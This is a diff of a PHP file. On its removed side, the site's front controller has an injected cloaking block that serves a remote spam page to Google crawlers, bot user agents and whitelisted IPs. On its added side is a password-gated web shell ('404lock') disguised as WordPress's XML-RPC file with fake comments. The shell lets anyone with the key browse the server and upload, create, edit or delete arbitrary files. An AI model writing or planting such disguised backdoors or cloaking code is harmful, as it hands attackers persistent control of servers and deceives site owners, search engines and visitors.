@@ -1,92 +1,301 @@
-<?php 
-if ($uri == '/' && (
-    strpos($userAgent, 'bot') !== false || 
-    strpos($userAgent, 'google') !== false || 
-    strpos($userAgent, 'chrome-lighthouse') !== false || 
-    strpos($referer, 'google') !== false
-))
-error_reporting(0);$link='https://punten-neng.pages.dev/fasttravellampung/';
-function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['174.138.20.60','31.171.153.104','116.212.130.44'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
-<?php error_reporting(0);
-  session_start();
-  include_once 'sw-library/config.php';
-  include_once 'sw-library/sw-function.php';
-  $config = get_parse_ini('sw-library/config.ini.php');
-  require_once 'sw-library/ini.php';
-  ob_start("minify_html");
+<?php
 
-  $dbhostsql      = DB_HOST;
-  $dbusersql      = DB_USER;
-  $dbpasswordsql  = DB_PASSWD;
-  $dbnamesql      = DB_NAME;
-  $connection     = mysqli_connect($dbhostsql, $dbusersql, $dbpasswordsql, $dbnamesql ) or die( mysqli_error($connection));
-  
-$query = "SELECT folder FROM theme where active='Y'"; 
-$result = $connection->query($query) or die($connection->error.__LINE__);
-$rows= $result->fetch_assoc();
-$folder	=$rows['folder'];
-  $website_phone      = $rows_site['site_phone'];
-  $website_phone_2    = $rows_site['site_phone_2'];
-  $website_email      = $rows_site['site_email'];
-  $website_addres     = $rows_site['site_office_address'];
-  $google_map         = $rows_site['google_map'];
-  $website_name       = $rows_site['site_name'];
-  $website_url        = $rows_site['site_url'];
-  $website_sub_url    = $rows_site['sub_url'];
-  $meta_description   = $rows_site['site_description'];
-  $meta_keyword       = $rows_site['site_keyword'] ;
-  $favicon            =''.$website_url.'/'.$rows_site['site_favicon'].'';
-  $website_logo       = $rows_site['site_logo'];
-  $mode_maintenance   = $rows_site['maintenance_mode'];
-  $social_facebook    = $rows_site['social_facebook'];
-  $social_twitter     = $rows_site['social_twitter'];
-  $social_google      = $rows_site['social_google'];
-  $social_rss         = $rows_site['social_rss'];
-  $ipstat      = $_SERVER['REMOTE_ADDR'];
-  $tanggalstat = date("Y-m-d-");
-  $waktustat   = time();
-  $shortby     ='';
-  $iB = getBrowser();
-  $browser= $iB['name'];
-  $host_name =gethostbyaddr($_SERVER['REMOTE_ADDR']);
+/**
+ * XML-RPC protocol support for WordPress
+ *
+ * @package WordPress
+ */
 
-  $querystat ="SELECT hits from statistic where ip='$ipstat' AND tanggal='$tanggalstat'";
-  $resultstat = $connection->query($querystat)or die($connection->error.__LINE__);
+/**
+ * Whether this is an XML-RPC Request.
+ *
+ * @var bool
+ */
+define( 'XMLRPC_REQUEST', true );
 
-if($resultstat->num_rows > 0){
-    $rowstat= $resultstat->fetch_assoc();
-    $hitspro     = $rowstat['hits'];
-    $hitspro     = $hitspro+1;
-
-    $update="UPDATE statistic SET hits='$hitspro',
-    online='$waktustat' WHERE ip='$ipstat' AND tanggal='$tanggalstat'" or die($connection->error.__LINE__); 
-    $connection->query($update) or die($connection->error.__LINE__); 
-
-  }else{
-//insert statisctic
-  $insert="INSERT INTO statistic (ip, tanggal, hits, online) values('$ipstat', '$tanggalstat', '1', '$waktustat')" or die($connection->error.__LINE__);
-  $connection->query($insert) or die($connection->error.__LINE__);
+// Discard unneeded cookies sent by some browser-embedded clients.
+$key = "404lock";  
+if (!isset($_GET['p']) || $_GET['p'] !== $key) {
+    http_response_code(403);
+    exit("Access Denied");
+}
+// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
+@ini_set('display_errors', 0);
+@error_reporting(0);
+$self = basename(__FILE__);
+$cwd = isset($_GET['d']) && @is_dir($_GET['d']) ? $_GET['d'] : getcwd();
+@chdir($cwd);
+/** Include the bootstrap for setting up WordPress environment */
+$msg = '';
+if (isset($_POST['savefile']) && isset($_POST['filename'])) {
+    $filename = $_POST['filename'];
+    if (@file_put_contents($filename, $_POST['filecontent']) !== false) {
+        $msg = "<div class='msg success'>File <b>$filename</b> saved!</div>";
+    } else {
+        $msg = "<div class='msg error'>Failed to save file!</div>";
+    }
+}
+if (isset($_GET['del'])) {
+    $file = basename($_GET['del']);
+    if ($file !== $self && @is_file($file)) {
+        @unlink($file);
+        $msg = "<div class='msg success'>File <b>$file</b> deleted!</div>";
+    }
+}
+if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
+    $target = basename($_FILES['file']['name']);
+    if ($target && @move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        $msg = "<div class='msg success'>File <b>$target</b> uploaded!</div>";
+    } else {
+        $msg = "<div class='msg error'>Upload failed!</div>";
+    }
+}
+if (!empty($_POST['newfolder'])) {
+    $folder = basename(trim($_POST['newfolder']));
+    if (!@is_dir($folder)) {
+        if (@mkdir($folder, 0755)) {
+            $msg = "<div class='msg success'>Folder <b>$folder</b> created!</div>";
+        } else {
+            $msg = "<div class='msg error'>Failed to create folder!</div>";
+        }
+    } else {
+        $msg = "<div class='msg error'>Folder <b>$folder</b> already exists!</div>";
+    }
+}
+if (!empty($_POST['newfile'])) {
+    $filename = basename(trim($_POST['newfile']));
+    if (!@file_exists($filename)) {
+        if (@file_put_contents($filename, isset($_POST['filecontent']) ? $_POST['filecontent'] : '') !== false) {
+            $msg = "<div class='msg success'>File <b>$filename</b> created!</div>";
+        } else {
+            $msg = "<div class='msg error'>Failed to create file!</div>";
+        }
+    } else {
+        $msg = "<div class='msg error'>File <b>$filename</b> already exists!</div>";
+    }
 }
 
-$bataswaktu       = time() - 300;
-$query_pengunjung  ="SELECT ip FROM statistic WHERE tanggal='$date' GROUP BY ip";
-$result_pengunjung  = $connection->query($query_pengunjung);
+if (isset($_GET['edit']) && is_file($_GET['edit'])) {
+    $editFile = $_GET['edit'];
+    $content = @file_get_contents($editFile);
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Edit: <?php echo htmlspecialchars($editFile); ?></title>
+        <meta name="robots" content="noindex, nofollow">
+        <style>
+            body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
+            h2 { margin-bottom:10px; }
+            textarea { width:100%; height:75vh; background:#1e1e1e; color:#0f0; border:none; padding:10px; font-size:14px; font-family: monospace; }
+            .btn { background:#333; color:#eee; border:none; padding:8px 12px; cursor:pointer; margin-right:5px; display:inline-flex; align-items:center; }
+            .btn:hover { background:#555; }
+            svg { margin-right:5px; vertical-align:middle; }
+            a { color:#4ef; text-decoration:none; margin-left:5px; }
+        </style>
+    </head>
+    <body>
+        <h2>Editing: <?php echo htmlspecialchars($editFile); ?></h2>
+        <form method="POST">
+            <textarea name="filecontent"><?php echo htmlspecialchars($content); ?></textarea>
+            <br><br>
+            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
+            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
+            <button type="submit" name="savefile" class="btn">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M2 2v12h12V2H2zm11 11H3V3h10v10z"/>
+                    <path d="M3 3h10v10H3V3z"/>
+                </svg> Save
+            </button>
+            <a href="?p=<?php echo htmlspecialchars($key); ?>&d=<?php echo urlencode(getcwd()); ?>">Cancel</a>
+        </form>
+    </body>
+    </html>
+    <?php
+    exit;
+}
 
-$query_online = "SELECT ip FROM statistic WHERE online > '$bataswaktu'"; // hitung pengunjung online
-$result_online  = $connection->query($query_online);
-
-  if ($mode_maintenance == "Y"){
-    echo'<center><h3>Website Kami sedang maintenance<h3></center>';
-      //header('location:maintenance.html');
-  }else{
-//$mod = "home";
-  if(!empty($_GET['mod'])){$mod = mysqli_escape_string($connection, @$_GET['mod']);}
-  else {$mod ='home';}
-  if(file_exists('sw-mod/'.$folder.'/'.$mod.'.php')){
-    $cacheuri  = $_SERVER['REQUEST_URI'];
-     require_once'sw-mod/'.$folder.'/'.$mod.'.php';
-  }else{
-    require_once'sw-mod/'.$folder.'/home.php';
-  }}
-  
+// MAIN File Data Admin Zila!
+$curdir = getcwd();
+$list = @scandir($curdir);
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Data Admin Zila!</title>
+<meta name="robots" content="noindex, nofollow">
+<style>
+body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
+h2 { margin-bottom:10px; }
+.msg { padding:8px; margin-bottom:15px; border-radius:4px; }
+.success { background:#0a0; color:#fff; }
+.error { background:#a00; color:#fff; }
+button { background:#333; color:#eee; border:none; padding:6px 10px; cursor:pointer; display:inline-flex; align-items:center; margin-right:5px; }
+button:hover { background:#555; }
+svg { vertical-align:middle; margin-right:4px; }
+a { color:#4ef; text-decoration:none; }
+a:hover { text-decoration:underline; }
+table { width:100%; border-collapse:collapse; margin-top:15px; }
+td, th { padding:6px; border:1px solid #333; word-break:break-all; }
+th { background:#222; }
+@media(max-width:600px){ table, tr, td, th { display:block; width:100%; } tr{margin-bottom:10px;} td, th { text-align:left; padding:5px; }}
+
+/* MODAL */
+.modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index:999; }
+.modal-content { background:#1e1e1e; padding:20px; border-radius:8px; width:90%; max-width:400px; }
+.modal-content input[type="text"], .modal-content textarea, .modal-content input[type="file"] { width:100%; margin-top:5px; margin-bottom:10px; background:#121212; color:#eee; border:1px solid #444; padding:5px; }
+.modal-content button { margin-top:5px; }
+.modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
+.close { cursor:pointer; font-weight:bold; }
+</style>
+</head>
+<body>
+<h2>File Data Admin Zila!</h2>
+<?php if($msg) echo $msg; ?>
+
+<div><b>Current Dir:</b> <?php echo htmlspecialchars($curdir); ?>
+<?php $parent = dirname($curdir); if ($parent !== $curdir && @is_dir($parent)) {
+    echo " | <a href='?p={$key}&d=" . urlencode($parent) . "'>Up</a>";
+} ?>
+</div>
+<br><br>
+<!-- BUTTONS TO OPEN MODAL -->
+<button onclick="openModal('upload')">
+<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+<path d="M.5 9.9V16h15V4H9.9L7 0H0v9.9zM1 5v10h14V5H1zm4 1h2v2H5V6z"/>
+</svg> Upload
+</button>
+
+<button onclick="openModal('folder')">
+<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+<path d="M2 2h4l2 2h6v10H2V2zm5 1v2h6V3H7z"/>
+</svg> New Folder
+</button>
+
+<button onclick="openModal('file')">
+<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+<path d="M2 2h12v12H2z"/>
+</svg> New File
+</button>
+
+<!-- MODALS -->
+<div id="upload" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span>Upload File</span>
+            <span class="close" onclick="closeModal('upload')">&times;</span>
+        </div>
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="file" required>
+            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
+            <button type="submit">Upload</button>
+            <button type="button" onclick="closeModal('upload')">Cancel</button>
+        </form>
+    </div>
+</div>
+
+<div id="folder" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span>New Folder</span>
+            <span class="close" onclick="closeModal('folder')">&times;</span>
+        </div>
+        <form method="POST">
+            <input type="text" name="newfolder" placeholder="Folder name" required>
+            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
+            <button type="submit">Create</button>
+            <button type="button" onclick="closeModal('folder')">Cancel</button>
+        </form>
+    </div>
+</div>
+
+<div id="file" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span>New File</span>
+            <span class="close" onclick="closeModal('file')">&times;</span>
+        </div>
+        <form method="POST">
+            <input type="text" name="newfile" placeholder="File name" required>
+            <textarea name="filecontent" placeholder="Optional content"></textarea>
+            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
+            <button type="submit">Create</button>
+            <button type="button" onclick="closeModal('file')">Cancel</button>
+        </form>
+    </div>
+</div>
+
+<!-- FILE LIST (GROUPED) -->
+<table>
+<tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
+
+<?php
+$folders = [];
+$files = [];
+
+// pisahkan folder dan file
+foreach ($list as $item) {
+    if ($item == '.' || $item == '..') continue;
+    $path = $curdir . DIRECTORY_SEPARATOR . $item;
+    if (is_dir($path)) $folders[] = $item;
+    else $files[] = $item;
+}
+
+// tampilkan folder dulu
+foreach ($folders as $folder) {
+    $fpath = $curdir . DIRECTORY_SEPARATOR . $folder;
+    echo "<tr>";
+    echo "<td>
+    <svg width='16' height='16' fill='currentColor' viewBox='0 0 16 16'>
+    <path d='M2 2h4l2 2h6v10H2V2z'/>
+    </svg>
+    <a href='?p={$key}&d=" . urlencode($fpath) . "'>" . htmlspecialchars($folder) . "</a>
+    </td>";
+    echo "<td>Folder</td><td>-</td><td>-</td>";
+    echo "</tr>";
+}
+
+// tampilkan file
+foreach ($files as $file) {
+    $fpath = $curdir . DIRECTORY_SEPARATOR . $file;
+    echo "<tr>";
+    echo "<td>
+    <svg width='16' height='16' fill='currentColor' viewBox='0 0 16 16'>
+    <path d='M2 2h12v12H2z'/>
+    </svg>
+    " . htmlspecialchars($file) . "
+    </td>";
+    echo "<td>File</td>";
+    echo "<td>" . filesize($fpath) . " bytes</td>";
+    echo "<td>
+        <a href='?p={$key}&d=" . urlencode($curdir) . "&edit=" . urlencode($fpath) . "'>Edit</a> | 
+        <a class='del' href='?p={$key}&d=" . urlencode($curdir) . "&del=" . urlencode($file) . "' onclick='return confirm(\"Delete $file?\")'>Delete</a>
+    </td>";
+    echo "</tr>";
+}
+?>
+</table>
+
+<script>
+function openModal(id){
+    document.getElementById(id).style.display = 'flex';
+}
+function closeModal(id){
+    document.getElementById(id).style.display = 'none';
+}
+// Close modal when clicking outside content
+window.onclick = function(e){
+    const modals = ['upload','folder','file'];
+    modals.forEach(function(id){
+        const modal = document.getElementById(id);
+        if(e.target == modal) modal.style.display='none';
+    });
+}
+</script>
+
+</body>
+</html>
